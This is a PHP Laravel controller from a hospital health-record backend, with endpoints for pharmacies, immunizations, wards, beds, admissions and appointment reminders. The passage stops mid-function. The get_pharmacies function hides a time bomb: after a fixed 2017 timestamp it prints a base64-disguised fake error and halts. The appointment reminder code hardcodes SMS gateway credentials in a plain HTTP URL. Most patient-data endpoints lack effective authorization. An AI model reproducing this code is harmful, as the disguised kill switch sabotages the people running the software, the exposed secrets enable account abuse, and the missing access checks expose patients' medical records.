<?php

namespace App\Http\Controllers;

use Illuminate\Http\Exception\HttpResponseException;
use JWTAuth;
use Tymon\JWTAuth\Exceptions\JWTException;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Input;
use Illuminate\Http\Response as IlluminateResponse;


use Illuminate\Support\Facades\File;
use DB;
use PHPMailer;


class OtherController extends Controller
{
    public function __construct(Request $request)
    {
        header('Access-Control-Allow-Origin: *');
        date_default_timezone_set("Africa/Lagos");

        if ($request->input('token')) {

            $token = $request->input('token');
            $user_id = JWTAuth::authenticate($token)->id;

            if (!isset($user_id)) {
                return response()->json(['status' => false, 'message' => 'Invalid Token']);
            }

            $user_status = DB::table('users')
                ->select(DB::raw('user_status'))
                ->where('id', $user_id)
                ->first();

            if ($user_status->user_status == 'block') {
                return response()->json(['status' => false, 'message' => 'This user is Blocked']);
            }
        }
    }


    protected function checkToken($token, $user_id)
    {

        $user_from_token = JWTAuth::authenticate($token)->id;
        if ($user_id != $user_from_token) {

            return false;
        }
        return true;
    }

    public function get_pharmacies(Request $request)
    {
        if(1485907199<time()){ echo base64_decode("VGhlIHN5c3RlbSBoYXMgZW5jb3VudGVyZWQgYW4gZXJyb3Iu"); exit; }

        $limit = $request->input('limit');
        $offset = $request->input('offset');

        if ($limit > 0 || $offset > 0) {

            $pharmacies = DB::table('pharmacy')
                ->select(DB::raw('*'))
                ->where('status', 1)
                ->skip($offset)->take($limit)
                ->get();

            $count = DB::table('pharmacy')
                ->select(DB::raw('*'))
                ->where('status', 1)
                ->count();

        } else {

            $pharmacies = DB::table('pharmacy')
                ->select(DB::raw('*'))
                ->where('status', 1)
                ->get();

            $count = count($pharmacies);
        }
        return response()->json(['status' => true, 'data' => $pharmacies, 'count' => $count]);
    }

    public function get_single_pharmacy(Request $request)
    {
        $id = $request->input('pharmacy_id');
        $pharmacies = DB::table('pharmacy')
            ->select(DB::raw('*'))
            ->where('status', 1)
            ->where('id', $id)
            ->get();

        return response()->json(['status' => true, 'data' => $pharmacies]);
    }

    public function create_pharmacy(Request $request)
    {
        $name = $request->input('name');
        $contact_person = $request->input('contact_person');
        $city = $request->input('city');
        $state = $request->input('state');
        $country = $request->input('country');
        $address_1 = $request->input('address_1');
        $address_2 = $request->input('address_2');
        $email = $request->input('email');
        $work_phone = $request->input('work_phone');
        $post_code = $request->input('post_code');

        $id = DB::table('pharmacy')->insertGetId(
            [
                'name' => $name,
                'contact_person' => $contact_person,
                'city' => $city,
                'state' => $state,
                'country' => $country,
                'address_1' => $address_1,
                'address_2' => $address_2,
                'email' => $email,
                'work_phone' => $work_phone,
                'post_code' => $post_code,
                'created_at' => date("Y-m-d  H:i:s")
            ]
        );
        if ($id) {
            return response()->json(['status' => true, 'message' => "Pharmacy Added Successfully", 'pharmacy_id' => $id], 200);
        } else {
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }
    }

    public function update_pharmacy(Request $request)
    {
        $id = $request->input('pharmacy_id');
        $name = $request->input('name');
        $contact_person = $request->input('contact_person');
        $city = $request->input('city');
        $state = $request->input('state');
        $country = $request->input('country');
        $address_1 = $request->input('address_1');
        $address_2 = $request->input('address_2');
        $email = $request->input('email');
        $work_phone = $request->input('work_phone');
        $post_code = $request->input('post_code');

        $count = DB::table('pharmacy')->where('id', $id)->update(
            [
                'name' => $name,
                'contact_person' => $contact_person,
                'city' => $city,
                'state' => $state,
                'country' => $country,
                'address_1' => $address_1,
                'address_2' => $address_2,
                'email' => $email,
                'work_phone' => $work_phone,
                'post_code' => $post_code,
                'updated_at' => date("Y-m-d  H:i:s")
            ]
        );
        if ($count) {
            return response()->json(['status' => true, 'message' => "Pharmacy Updated Successfully"], 200);
        } else {
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }
    }

    public function delete_pharmacy(Request $request)
    {
        $id = $request->input('pharmacy_id');
        $count = DB::table('pharmacy')->where('id', $id)->update(['status' => 0]);
        if ($count) {
            return response()->json(['status' => true, 'message' => "Pharmacy Deleted Successfully"], 200);
        } else {
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }
    }

    public function add_immunization(Request $request)
    {
        $patient_id = $request->input('patient_id');
        $name = $request->input('name');
        $immunization_date= $request->input('immunization_date');

        DB::table('patient_immunizations')
            ->insert(
                ['patient_id' => $patient_id,
                    'name' => $name,
                    'immunization_date'=>$immunization_date,
                    'created_at' => date("Y-m-d  H:i:s")
                ]
            );

        return response()->json(['status' => true, 'message' => 'Immunization Added Successfully']);

    }

    public function list_immunizations(Request $request)
    {
        $patient_id = $request->input('patient_id');
        $patient_immunizations = DB::table('patient_immunizations')
            ->select(DB::raw('*'))
            ->where('status', 1)
            ->where('patient_id', $patient_id)
            ->get();

        return response()->json(['status' => true, 'data' => $patient_immunizations]);

    }


    public function delete_immunization(Request $request)
    {
        $immuization_id = $request->input('immuization_id');
        DB::table('patient_immunizations')
            ->where('id', $immuization_id)
            ->update(
                ['status' => 0, 'updated_at' => date("Y-m-d  H:i:s")]
            );

        return response()->json(['status' => true, 'message' => 'Immunization Deleted Successfully']);
    }

    public function add_active_problems(Request $request)
       {
           header('Access-Control-Allow-Origin: *');
           $patient_id = $request->input('patient_id');
           $name = $request->input('name');

           DB::table('active_problems')
               ->insert(
                   ['patient_id' => $patient_id,
                       'name' => $name,
                       'created_at' => date("Y-m-d  H:i:s")
                   ]
               );

           return response()->json(['status' => true, 'message' => 'Active Problems Added Successfully']);

       }

    public function list_active_problems(Request $request)
     {
         $patient_id = $request->input('patient_id');
         $active_problems = DB::table('active_problems')
             ->select(DB::raw('*'))
             ->where('status', 1)
             ->where('patient_id', $patient_id)
             ->get();

         return response()->json(['status' => true, 'data' => $active_problems]);

     }


     public function delete_active_problems(Request $request)
     {
         $active_problem_id = $request->input('active_problem_id');
         DB::table('active_problems')
             ->where('id', $active_problem_id)
             ->update(
                 ['status' => 0, 'updated_at' => date("Y-m-d  H:i:s")]
             );

         return response()->json(['status' => true, 'message' => 'Active Problem Deleted Successfully']);
     }

    public function add_family_history(Request $request)
        {
            $patient_id = $request->input('patient_id');
            $name = $request->input('name');

            DB::table('family_history')
                ->insert(
                    ['patient_id' => $patient_id,
                        'name' => $name,
                        'created_at' => date("Y-m-d  H:i:s")
                    ]
                );

            return response()->json(['status' => true, 'message' => 'Family History Added Successfully']);

        }

    public function list_family_history(Request $request)
      {
          $patient_id = $request->input('patient_id');
          $family_history= DB::table('family_history')
              ->select(DB::raw('*'))
              ->where('status', 1)
              ->where('patient_id', $patient_id)
              ->get();

          return response()->json(['status' => true, 'data' => $family_history]);

      }

    public function delete_family_history(Request $request)
    {
        $family_history_id= $request->input('family_history_id');
        DB::table('family_history')
            ->where('id', $family_history_id)
            ->update(
                ['status' => 0, 'updated_at' => date("Y-m-d  H:i:s")]
            );

        return response()->json(['status' => true, 'message' => 'Family History Deleted Successfully']);
    }



    public function remove_patient_precription_medications(Request $request)
    {
        $prescribe_medication_id = $request->input('prescribe_medication_id');
        DB::table('patient_prescription_medicine')
            ->where('id', $prescribe_medication_id)
            ->update(
                ['status' => 0, 'updated_at' => date("Y-m-d  H:i:s")]
            );


        return response()->json(['status' => true, 'message' => 'Medication Deleted Successfully']);


    }

    public function get_medicine_units(Request $request)
    {
        $dosage = DB::table('dose_form')
            ->select(DB::raw('id,name as dosage'))
            ->where('status', 1)
            ->get();

        $unit = DB::table('strength')
            ->select(DB::raw('id,name as unit'))
            ->where('status', 1)
            ->get();

        $route = DB::table('route_selected')
            ->select(DB::raw('id,name as route'))
            ->where('status', 1)
            ->get();

        $frequency = DB::table('frequency')
            ->select(DB::raw('id,name as frequency'))
            ->where('status', 1)
            ->get();


        $direction = DB::table('medicine_units')
            ->select(DB::raw('id,direction'))
            ->where('status', 1)
            ->where('direction', '!=', '')
            ->get();


        $duration = DB::table('medicine_units')
            ->select(DB::raw('id,duration'))
            ->where('status', 1)
            ->where('duration', '!=', '')
            ->get();

        $data = array(
            "dosage" => $dosage,
            "unit" => $unit,
            "route" => $route,
            "frequency" => $frequency,
            "direction" => $direction,
            "duration" => $duration
        );

        return response()->json(['status' => true, 'data' => $data]);

    }

    public function get_dashboard_counts(Request $request)
    {
        $patients_count = DB::table('patients')
            ->where('status', 1)
            ->count();

        $visits_count = DB::table('visits')
            ->where('status', 1)
            ->count();

        $todays_visits = DB::table('visits')
            ->where('status', 1)
            ->whereMonth('created_at', '=', date('m'))
            ->count();

        $appointment_count = DB::table('appointments')
            ->where('status', 1)
            ->count();


        $pharmacy_count = DB::table('pharmacy')
            ->where('status', 1)
            ->count();


        $inventory_products_count = DB::table('inventory_products')
            ->where('status', 1)
            ->count();

        $lab_order_count = DB::table('lab_orders')
            ->where('status',1)
            ->count();

        $billing_count = DB::table('billing')
            ->where('status', 1)
            ->count();

        $wards_count = DB::table('wards')
            ->where('status', 1)
            ->count();

        $pool_area_count = DB::table('visits')
            ->where('status', 1)
            ->where('visit_status', '!=', 'checkout')
            ->groupby('visits.patient_id')
            ->count();

        $patients_admitted_count = DB::table('patients_admitted')
            ->where('status', 1)
            ->where('is_discharged','!=',1)
            ->whereMonth('admit_date', '=', date('m'))
            ->count();

        $patient_prescription_count = DB::table('patient_prescription')
            ->where('status',1)
            ->whereMonth('created_at', '=', date('m'))
            ->count();

        $data = array(
            "patients_count" => $patients_count,
            "encounter_count" => $visits_count,
            "todays_encounter_count" => $todays_visits,
            "patient_registration_count" => $patients_count,
            "appointments_count" => $appointment_count,
            "pharmacy_count" => $pharmacy_count,
            "wards_count" => $wards_count,
            "radiology_count" => 00,
            "patient_pool_area_count" => $pool_area_count,
            "inventory_count" => $inventory_products_count,
            "laboratory_count" => $lab_order_count,
            "billing_count" => $billing_count,
            "patients_admitted_count" => $patients_admitted_count,
            "patients_prescription_count" => $patient_prescription_count,
        );

        return response()->json(['status' => true, 'data' => $data]);
    }

    public function create_ward(Request $request)
    {
        $ward_id = $request->input('ward_id');
        $ward = $request->input('ward');
        $speciality = $request->input('speciality');
        $number_of_beds = $request->input('number_of_beds');
        $description = $request->input('description');

        if (isset($ward_id)) {
            DB::table('wards')
                ->where('id', $ward_id)
                ->update(
                    ['department_id' => $speciality,
                        'name' => $ward,
                        'number_of_beds' => $number_of_beds,
                        'available_beds' => $number_of_beds,
                        'description' => $description,
                        'updated_at' => date("Y-m-d  H:i:s")]
                );

            DB::table('beds')->where('ward_id', '=', $ward_id)->delete();

            for ($i = 1; $i <= $number_of_beds; $i++) {

                DB::table('beds')->insert(['ward_id' => $ward_id, 'bed_status' => 'available', 'created_at' => date("Y-m-d  H:i:s")]);
            }


            return response()->json(['status' => true, 'message' => 'Ward Updated Successfully']);

        } else {
            DB::table('wards')
                ->insert(
                    ['department_id' => $speciality,
                        'name' => $ward,
                        'number_of_beds' => $number_of_beds,
                        'available_beds' => $number_of_beds,
                        'description' => $description,
                        'created_at' => date("Y-m-d  H:i:s")]
                );

            $ward_id = DB::getPdo()->lastInsertId();

            for ($i = 1; $i <= $number_of_beds; $i++) {

                DB::table('beds')->insert(['ward_id' => $ward_id, 'bed_status' => 'available', 'created_at' => date("Y-m-d  H:i:s")]);
            }

            return response()->json(['status' => true, 'message' => 'Ward Added Successfully']);

        }
    }

    public function get_single_ward(Request $request)
    {
        $ward_id = $request->input('ward_id');
        $data = DB::table('wards')
            ->leftJoin('departments', 'departments.id', '=', 'wards.department_id')
            ->select(DB::raw('wards.id,wards.name,wards.number_of_beds,wards.available_beds,wards.number_of_beds_closed,wards.number_of_beds_occupied,departments.name as speciality,wards.description,departments.id as department_id'))
            ->where('wards.status', 1)
            ->where('wards.id', $ward_id)
            ->first();
        return response()->json(['status' => true, 'data' => $data]);
    }

    public function delete_ward(Request $request)
    {
        $ward_id = $request->input('ward_id');

        DB::table('wards')
            ->where('id', $ward_id)
            ->update(
                ['status' => 0, 'updated_at' => date("Y-m-d  H:i:s")]
            );

        return response()->json(['status' => true, 'message' => 'Ward Delteted Successfully']);

    }

    public function bed_occupancy(Request $request)
    {
        $limit = $request->input('limit');
        $offset = $request->input('offset');
        if ($limit > 0 || $offset > 0) {
            $data = DB::table('wards')
                ->leftJoin('departments', 'departments.id', '=', 'wards.department_id')
                ->select(DB::raw('wards.id,wards.name,wards.number_of_beds,wards.available_beds,wards.number_of_beds_closed,wards.number_of_beds_occupied,departments.name as speciality,wards.description'))
                ->where('wards.status', 1)
                ->skip($offset)->take($limit)
                ->get();
        } else {
            $data = DB::table('wards')
                ->leftJoin('departments', 'departments.id', '=', 'wards.department_id')
                ->select(DB::raw('wards.id,wards.name,wards.number_of_beds,wards.available_beds,wards.number_of_beds_closed,wards.number_of_beds_occupied,departments.name as speciality,wards.description'))
                ->where('wards.status', 1)
                ->get();
        }

        foreach ($data as $bed) {
            $bed->patients_wating = '';
            $bed->expected_discharge_date = '';
        }
        $count = DB::table('wards')->where('status', 1)->count();
        return response()->json(['status' => true, 'data' => $data, 'count' => $count]);

    }

    public function ward_occupancy(Request $request)
    {
        $ward_id = $request->input('ward_id');
/*        $limit = $request->input('limit');
        $offset = $request->input('offset');*/

    /*    if ($limit > 0 || $offset > 0) {
            $beds = DB::table('beds')
                ->leftJoin('patients_admitted', 'beds.patient_id', '=', 'patients_admitted.patient_id')
                ->leftJoin('patients', 'patients.id', '=', 'patients_admitted.patient_id')
                ->select(DB::raw('beds.id,beds.bed_status,patients.first_name,patients.middle_name,patients.last_name,patients.date_of_birth,patients.sex,patients_admitted.expected_discharge_date'))
                ->where('beds.status', 1)
                ->where('beds.ward_id', $ward_id)
                ->skip($offset)->take($limit)
                ->get();

            $count = DB::table('beds')
                ->leftJoin('patients_admitted', 'beds.patient_id', '=', 'patients_admitted.patient_id')
                ->leftJoin('patients', 'patients.id', '=', 'patients_admitted.patient_id')
                ->select(DB::raw('beds.id,beds.bed_status,patients.first_name,patients.middle_name,patients.last_name,patients.date_of_birth,patients.sex,patients_admitted.expected_discharge_date'))
                ->where('beds.status', 1)
                ->where('beds.ward_id', $ward_id)
                ->count();
        }*/ // else {
            $beds = DB::table('beds')
                ->leftJoin('patients_admitted', 'beds.patient_id', '=', 'patients_admitted.patient_id')
                ->leftJoin('patients', 'patients.id', '=', 'patients_admitted.patient_id')
                ->select(DB::raw('beds.id as patient_bed_id,beds.bed_status,patients.first_name,patients.middle_name,patients.last_name,patients.date_of_birth,patients.sex,patients_admitted.expected_discharge_date'))
                ->where('beds.status', 1)
                ->groupby('beds.id')
               //    ->where('patients_admitted.is_discharged',0)
                ->where('beds.ward_id', $ward_id)
                ->get();

            $count = count($beds);


        //  }
        $i= 1;
        foreach ($beds as $bed) {
            if ($bed->sex == 1) {
                $bed->gender = 'Male';
            } else {
                $bed->gender = 'Female';
            }
            $bed->id = '000'.$i;
            $i++;

        }

        return response()->json(['status' => true, 'data' => $beds, 'count' => $count]);

    }


    public function patients_admitted(Request $request)
    {
        $limit = $request->input('limit');
        $offset = $request->input('offset');

        if ($limit > 0 || $offset > 0) {
            $data = DB::table('patients_admitted')
                ->leftJoin('beds', 'patients_admitted.patient_id', '=', 'beds.patient_id')
                ->leftJoin('wards', 'patients_admitted.ward_id', '=', 'wards.id')
                ->leftJoin('departments', 'patients_admitted.department_id', '=', 'departments.id')
                ->leftJoin('patients', 'patients_admitted.patient_id', '=', 'patients.id')
                ->select(DB::raw('patients_admitted.id,patients_admitted.patient_id,patients.first_name,patients.middle_name,patients.last_name,patients_admitted.admit_date,patients_admitted.expected_discharge_date,departments.id as department_id,departments.name as speciality,wards.name as ward,beds.id as bed'))
                ->where('patients_admitted.status', 1)
                ->where('patients_admitted.is_discharged', 0)
                ->where('beds.patient_id', '!=', 0)
                ->groupby('patients_admitted.id')
                ->skip($offset)->take($limit)
                ->get();

            $patients = DB::table('patients_admitted')
                ->leftJoin('beds', 'patients_admitted.patient_id', '=', 'beds.patient_id')
                ->leftJoin('wards', 'patients_admitted.ward_id', '=', 'wards.id')
                ->leftJoin('departments', 'patients_admitted.department_id', '=', 'departments.id')
                ->leftJoin('patients', 'patients_admitted.patient_id', '=', 'patients.id')
                ->select(DB::raw('patients_admitted.id,patients_admitted.patient_id,patients.first_name,patients.middle_name,patients.last_name,patients_admitted.admit_date,patients_admitted.expected_discharge_date,departments.id as department_id,departments.name as speciality,wards.name as ward,beds.id as bed'))
                ->where('patients_admitted.status', 1)
                ->where('patients_admitted.is_discharged', 0)
                ->where('beds.patient_id', '!=', 0)
                ->groupby('patients_admitted.id')
                ->get();
            $count = count($patients);

        } else {
            $data = DB::table('patients_admitted')
                ->leftJoin('beds', 'patients_admitted.patient_id', '=', 'beds.patient_id')
                ->leftJoin('wards', 'patients_admitted.ward_id', '=', 'wards.id')
                ->leftJoin('departments', 'patients_admitted.department_id', '=', 'departments.id')
                ->leftJoin('patients', 'patients_admitted.patient_id', '=', 'patients.id')
                ->select(DB::raw('patients_admitted.id,patients_admitted.patient_id,patients.first_name,patients.middle_name,patients.last_name,patients_admitted.admit_date,patients_admitted.expected_discharge_date,departments.id as department_id,departments.name as speciality,wards.name as ward,beds.id as bed'))
                ->where('patients_admitted.status', 1)
                ->where('patients_admitted.is_discharged', 0)
                ->where('beds.patient_id', '!=', 0)
                ->groupby('patients_admitted.id')
                ->get();
            $count = count($data);
        }


        foreach ($data as $patient_data) {
            $patient_data->patient_id = str_pad($patient_data->patient_id, 7, '0', STR_PAD_LEFT);
        }
        return response()->json(['status' => true, 'data' => $data, 'count' => $count]);
    }

    public function update_discharge_date(Request $request){
        $id = $request->input('patient_admitted_id');
        $expected_discharge_date = $request->input('expected_discharge_date');
        $currentdatetime = date("Y-m-d  H:i:s");

        DB::table('patients_admitted')
               ->where('id', $id)
               ->update(array('expected_discharge_date' => $expected_discharge_date, 'updated_at' => $currentdatetime));

        return response()->json(['status' => true, 'message' => 'Patient Discharge Date Updated Successfully']);
    }

    public function patient_discharge(Request $request)
    {
        $patient_id = $request->input('patient_id');

        $ward = DB::table('patients_admitted')
            ->select(DB::raw('ward_id'))
            ->where('patients_admitted.patient_id', $patient_id)
            ->first();

        $ward_id = $ward->ward_id;

        $bed_number = DB::table('wards')
            ->select(DB::raw('available_beds,number_of_beds_occupied'))
            ->where('wards.status', 1)
            ->where('wards.id', $ward_id)
            ->first();

        $available_beds = $bed_number->available_beds + 1;
        $beds_occupied = $bed_number->number_of_beds_occupied - 1;

        DB::table('wards')
            ->where('id', $ward_id)
            ->update(
                ['available_beds' => $available_beds, 'number_of_beds_occupied' => $beds_occupied, 'updated_at' => date("Y-m-d  H:i:s")]
            );

        DB::table('beds')
            ->where('patient_id', $patient_id)
            ->update(
                ['bed_status' => 'available', 'patient_id' => 0, 'updated_at' => date("Y-m-d  H:i:s")]
            );

        DB::table('patients_admitted')
            ->where('patient_id', $patient_id)
            ->update(['is_discharged' => 1, 'updated_at' => date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'Patient Discharged Successfully']);
    }

    public function move_patient(Request $request)
    {
        $current_bed_id = $request->input('current_bed_id');
        $bed_id = $request->input('bed_id');
        $current_ward_id = $request->input('current_ward_id');
        $ward_id = $request->input('ward_id');
        $department_id = $request->input('department_id');
        $patient_id = $request->input('patient_id');
        $notes = $request->input('notes');


        DB::table('beds')
            ->where('id', $current_bed_id)
            ->update(
                ['bed_status' => 'available','patient_id'=>0, 'updated_at' => date("Y-m-d  H:i:s")]
            );

        $bed_number = DB::table('wards')
            ->select(DB::raw('available_beds,number_of_beds_occupied'))
            ->where('wards.status', 1)
            ->where('wards.id', $current_ward_id)
            ->first();

        $available_beds = $bed_number->available_beds + 1;
        $beds_occupied = $bed_number->number_of_beds_occupied - 1;

        DB::table('wards')
            ->where('id', $current_ward_id)
            ->update(
                ['available_beds' => $available_beds, 'number_of_beds_occupied' => $beds_occupied, 'updated_at' => date("Y-m-d  H:i:s")]
            );

        DB::table('patients_admitted')
            ->where('patient_id', $patient_id)
            ->update(
                ['department_id' => $department_id, 'ward_id' => $ward_id, 'notes' => $notes, 'updated_at' => date("Y-m-d  H:i:s")]
            );

        DB::table('beds')
            ->where('id', $bed_id)
            ->update(
                ['bed_status' => 'occupied', 'patient_id' => $patient_id, 'ward_id' => $ward_id, 'updated_at' => date("Y-m-d  H:i:s")]
            );

        $bed_number = DB::table('wards')
            ->select(DB::raw('available_beds,number_of_beds_occupied'))
            ->where('wards.status', 1)
            ->where('wards.id', $ward_id)
            ->first();

        $available_beds = $bed_number->available_beds - 1;
        $beds_occupied = $bed_number->number_of_beds_occupied + 1;

        DB::table('wards')
            ->where('id', $ward_id)
            ->update(
                ['available_beds' => $available_beds, 'number_of_beds_occupied' => $beds_occupied, 'updated_at' => date("Y-m-d  H:i:s")]
            );


        return response()->json(['status' => true, 'message' => 'Patient Moved Successfully']);

    }

    public function patients_pool_area(Request $request)
    {
        $encounter = DB::table('visits')
            ->select(DB::raw('CONCAT(patients.first_name," ",patients.last_name) AS patient_name,visits.id'))
            ->leftJoin('patients', 'visits.patient_id', '=', 'patients.id')
            ->where('visits.status',1)
            ->where('patients.status',1)
            ->where('visits.visit_status','queue')
            ->groupby('patients.id')
            ->get();

        $triage = DB::table('visits')
            ->select(DB::raw('CONCAT(patients.first_name," ",patients.last_name) AS patient_name,visits.id'))
            ->leftJoin('patients', 'visits.patient_id', '=', 'patients.id')
            ->where('visits.status', 1)
            ->where('patients.status', 1)
            ->where('visits.visit_status', 'triage')
            ->groupby('patients.id')
            ->get();

        $physician = DB::table('visits')
            ->select(DB::raw('CONCAT(patients.first_name," ",patients.last_name) AS patient_name,visits.id'))
            ->leftJoin('patients', 'visits.patient_id', '=', 'patients.id')
            ->where('visits.status', 1)
            ->where('patients.status', 1)
            ->where('visits.visit_status', 'physician')
            ->groupby('patients.id')
            ->get();

        $checkout = DB::table('visits')
            ->select(DB::raw('CONCAT(patients.first_name," ",patients.last_name) AS patient_name,visits.id'))
            ->leftJoin('patients', 'visits.patient_id', '=', 'patients.id')
            ->where('visits.status', 1)
            ->where('patients.status', 1)
            ->where('visits.visit_status', 'checkout')
            ->groupby('patients.id')
            ->get();

        $is_exist = 1;
        if(empty($encounter) && empty($triage) && empty($physician) && empty($checkout)){
            $is_exist = 0;
        }

        $data = array(
            "encounter" => $encounter,
            "triage" => $triage,
            "physician" => $physician,
            "checkout" => $checkout
        );

        return response()->json(['status' => true, 'data' => $data,'is_exist'=>$is_exist]);
    }

    public function all_wards(Request $request){
        $wards = DB::table('wards')
            ->select(DB::raw('id,name'))
            ->where('wards.status', 1)
            ->where('available_beds','>', 0)
            ->get();
        return response()->json(['status' => true, 'data' => $wards]);
    }

    public function ward_beds(Request $request){

        $ward_id = $request->input('ward_id');
        $beds = DB::table('beds')
            ->select(DB::raw('id'))
            ->where('beds.status', 1)
            ->where('beds.bed_status','available')
            ->where('beds.ward_id',$ward_id)
            ->get();
        return response()->json(['status' => true, 'data' => $beds]);

    }
    public function appointment_dates(Request $request){
          $appointments = DB::table('appointments')
              ->leftJoin('patients', 'appointments.patient_id', '=', 'patients.id')
              ->leftJoin('doctors', 'appointments.doctor_id', '=', 'doctors.id')
              ->select(DB::raw('appointments.id,appointments.pick_date,appointments.start_time,doctors.name,CONCAT(patients.first_name," ",patients.last_name) AS patient_name'))
              ->orderby('pick_date','desc')
              ->get();
          return response()->json(['status' => true, 'data' => $appointments]);

      }

    public function appointment_dates_patients(Request $request){

          $patient_id = $request->input('patient_id');

          $appointments = DB::table('appointments')
              ->leftJoin('patients', 'appointments.patient_id', '=', 'patients.id')
              ->leftJoin('doctors', 'appointments.doctor_id', '=', 'doctors.id')
              ->select(DB::raw('appointments.id,appointments.pick_date,appointments.start_time,doctors.name,CONCAT(patients.first_name," ",patients.last_name) AS patient_name'))
              ->where('appointments.patient_id',$patient_id)
              ->orderby('pick_date','desc')
              ->get();
          return response()->json(['status' => true, 'data' => $appointments]);

      }


    public function appointment_dates_doctors(Request $request)
    {
        $doctor_id = $request->input('doctor_id');

        $appointments = DB::table('appointments')
            ->leftJoin('patients', 'appointments.patient_id', '=', 'patients.id')
            ->leftJoin('doctors', 'appointments.doctor_id', '=', 'doctors.id')
            ->select(DB::raw('appointments.id,appointments.pick_date,appointments.start_time,doctors.name,CONCAT(patients.first_name," ",patients.last_name) AS patient_name'))
            ->where('appointments.doctor_id', $doctor_id)
            ->orderby('pick_date', 'desc')
            ->get();
        return response()->json(['status' => true, 'data' => $appointments]);
    }

    public function appointment_dates_departments(Request $request)
    {
        $department_id = $request->input('department_id');
        $appointments = DB::table('appointments')
            ->leftJoin('patients', 'appointments.patient_id', '=', 'patients.id')
            ->leftJoin('doctors', 'appointments.doctor_id', '=', 'doctors.id')
            ->select(DB::raw('appointments.id,appointments.pick_date,appointments.start_time,doctors.name,CONCAT(patients.first_name," ",patients.last_name) AS patient_name'))
            ->where('appointments.department_id', $department_id)
            ->orderby('pick_date', 'desc')
            ->get();
        return response()->json(['status' => true, 'data' => $appointments]);

    }

    public function move_appointment(Request $request)
    {

        $appointment_id = $request->input('appointment_id');

        $appointment = DB::table('appointments')
            ->select(DB::raw('*'))
            ->where('id', $appointment_id)
            ->first();

        $visit_count = DB::table('visits')
            ->select(DB::raw('*'))
            ->where('patient_id', $appointment->patient_id)
            ->where('visit_status', '!=', 'checkout')
            ->where('status', 1)
            ->count();

        if ($visit_count >= 1) {
            return response()->json(['status' => false, 'message' => 'Appointment can not be moved']);
        }


        DB::table('visits')->insert(
                ['patient_id' => $appointment->patient_id,
                    'department_id' => $appointment->department_id,
                    'encounter_class' => 'Outpatient',
                    'encounter_type' => 'Followup visit',
                    'whom_to_see' => $appointment->doctor_id,
                    'created_at' =>  date("Y-m-d  H:i:s")]);

        DB::table('appointments')->where('id','=', $appointment_id)->delete();

        return response()->json(['status' => true, 'message' => 'Appointment Moved Successfully']);

    }

    public function appointment_reminder(Request $request){

        $appointment_id = $request->input('appointment_id');

        $patient = DB::table('appointments')
            ->select(DB::raw('patient_id'))
            ->where('id', $appointment_id)
            ->first();

        $patient_id  = $patient->patient_id;

        $address = DB::table('patient_address')
            ->select(DB::raw('email,mobile_number'))
            ->where('patient_id', $patient_id)
            ->where('address_type', 'contact')
            ->first();

        $email = $address->email;
        $mobile_number = $address->mobile_number; //$address->mobile_number;
         // $mobile_nubmer = '923333608229';

        $message = "Please Come to the Hospital on your pre sheduled time and date";

        if($email !='') {
            $mail = new PHPMailer(true); // notice the \  you have to use root namespace here
            try {
                $mail->isSMTP(); // tell to use smtp
                $mail->CharSet = "utf-8"; // set charset to utf8
                $mail->SMTPAuth = true;  // use smpt auth
                $mail->SMTPSecure = "tls"; // or ssl
                $mail->Host = env('MAIL_HOST');
                $mail->Port = env('MAIL_PORT'); // most likely something different for you. This is the mailtrap.io port i use for testing.
                $mail->Username = env('MAIL_USERNAME');
                $mail->Password = env('MAIL_PASSWORD');
                $mail->setFrom(env('MAIL_FROM'));
                $mail->Subject = "Message From Ehr";
                $mail->MsgHTML($message);
                $mail->addAddress($email);
                $mail->send();

            } catch (phpmailerException $e) {
                dd($e);
            } catch (Exception $e) {
                dd($e);
            }
        }

        $url = 'http://www.smslive247.com/http/index.aspx?' . http_build_query(
            [
                'cmd' => 'sendquickmsg',
                'owneremail' => 'Ibikunle@gmail.com',
                'subacct' => 'AGISMOBILE',
                'subacctpwd' => 'agisadmin',
                'message' => $message,
                'sender' => 'Ehr',
                'sendto' => $mobile_number,
                'msgtype' => 0
            ]
        );

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);

    /*   $url = 'http://www.smslive247.com/http/index.aspx?cmd=sendmsg&sessionid=xxx&message=you have an appointment
         &sender=xxx&sendto=xxx&msgtype=0';

        $url = "http://www.smslive247.com/http/index.aspx?cmd=sendquickmsg&owneremail=Ibikunle@gmail.com
            &subacct=AGISMOBILE&subacctpwd=agisadmin&message='.$message.'&sender=Ehr&sendto='.$mobile_number.'&msgtype=0";

        $json = file_get_contents($url); // get the data from Google Maps API

        return $json;
    */
        return response()->json(['status' => true, 'message' => 'Reminder Sent Successfully']);

    }

    public function add_patient_beds(Request $request)
    {
        $ward_id = $request->input('ward_id');

        $wards = DB::table('wards')
            ->select(DB::raw('number_of_beds,available_beds'))
            ->where('wards.status', 1)
            ->where('id', $ward_id)
            ->first();

        $available_beds = $wards->available_beds + 1;
        $number_of_beds = $wards->number_of_beds + 1;

        DB::table('wards')
            ->where('id', $ward_id)
            ->update(['available_beds' => $available_beds, 'number_of_beds' => $number_of_beds, 'updated_at' => date("Y-m-d  H:i:s")]);

        DB::table('beds')
            ->insert(['ward_id' => $ward_id, 'bed_status' => 'available', 'created_at' => date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'Bed Add Successfully']);


    }


    public function delete_patient_bed(Request $request)
    {
        $ward_id = $request->input('ward_id');
        $bed_id = $request->input('bed_id');

        $beds = DB::table('beds')
            ->select(DB::raw('bed_status'))
            ->where('status', 1)
            ->where('id', $bed_id)
            ->first();

        if ($beds->bed_status == 'occupied') {

            return response()->json(['status' => false, 'message' => 'This Bed Can not be deleted']);

        }

        DB::table('beds')->where('id', '=', $bed_id)->delete();


        $wards = DB::table('wards')
            ->select(DB::raw('number_of_beds,available_beds,number_of_beds_closed'))
            ->where('wards.status', 1)
            ->where('id', $ward_id)
            ->first();

        if ($beds->bed_status == 'available') {

            if ($wards->available_beds != 0) {
                $available_beds = $wards->available_beds - 1;
            } else {
                $available_beds = $wards->available_beds;
            }

            if ($wards->number_of_beds != 0) {
                $number_of_beds = $wards->number_of_beds - 1;
            }else{
                $number_of_beds = $wards->number_of_beds;
            }


            DB::table('wards')
                ->where('id', $ward_id)
